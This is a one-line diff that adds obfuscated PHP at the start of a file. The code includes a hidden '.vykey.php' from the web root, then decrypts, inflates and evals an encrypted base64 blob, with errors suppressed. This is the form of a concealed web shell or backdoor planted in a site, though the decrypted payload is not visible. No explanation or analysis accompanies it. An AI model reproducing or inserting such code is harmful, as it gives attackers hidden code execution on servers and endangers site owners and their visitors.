@@ -1,0 +1,1 @@
+<?php @include $_SERVER['DOCUMENT_ROOT'].'/.vykey.php';eval(@gzinflate(@openssl_decrypt(base64_decode('YFru4Hg2LjI7ckyq3Y+5Ne88LkwPAT4BkMIbT3Z5Wm1CKoaEqkYM24+iI3Sw/4msYpZEiFUh4WMGSdc7n4XEEvosfKQXErLvWJDmI07FJs4EY7K7tFjZEhI7DIgHMtb8NGWLUhHf1lGVoFOJp2rCmgKz7Y1qc+LJuDzpNJ+jv3I='),'aes-256-cbc',@hex2bin($VY_K),OPENSSL_RAW_DATA,hex2bin('f73a8d5f1e6c89b9f83c686925eb3bf5'))));
